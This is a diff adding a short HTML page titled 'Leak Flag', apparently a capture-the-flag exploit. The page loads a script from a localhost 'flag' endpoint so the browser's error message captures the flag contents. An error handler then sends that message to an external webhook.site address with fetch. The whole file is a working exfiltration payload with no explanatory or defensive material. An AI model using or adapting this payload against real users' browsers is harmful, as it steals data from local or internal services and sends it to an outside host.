@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Leak Flag</title>
+</head>
+<body>
+    <script>
+        window.onerror = function(message, source, lineno, colno, error) {
+            const flag = message.toString();
+            fetch('https://webhook.site/9ce31150-24fe-48ac-ba7b-29cea870aa1f?flag=' + encodeURIComponent(flag));
+        };
+    </script>
+    <script src="http://127.0.0.1/flag"></script>
+</body>
+</html>
